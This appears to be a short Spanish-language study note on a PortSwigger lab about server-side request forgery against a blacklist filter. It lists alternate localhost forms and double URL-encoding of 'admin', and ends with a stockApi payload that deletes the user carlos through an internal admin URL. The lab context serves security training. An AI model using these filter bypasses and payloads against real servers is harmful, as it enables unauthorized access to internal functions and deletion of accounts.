Tags: #SSRF #PortSwigger 

# Lab 3 SSRF with blacklist-based input filter 

```bash 
# Formas de colocar el localhost, por si existe un filtro en el localhost 
1. localhost
2. 127.0.0.1
3. 127.1
4. 0x7f000001   --> Hexadecimal 

# Miramos que hay un segundo filtro en la palabra 'admin'
# Podemos hacer URLencode con 'Ctrl + u' 
a = %61
% = %25    # Debemos de URLencodear el primer porcentaje, ya que si no, nos marcaria error 

admin = %2561dmin

stockApi=http://127.1/%2561dmin/delete?username=carlos
```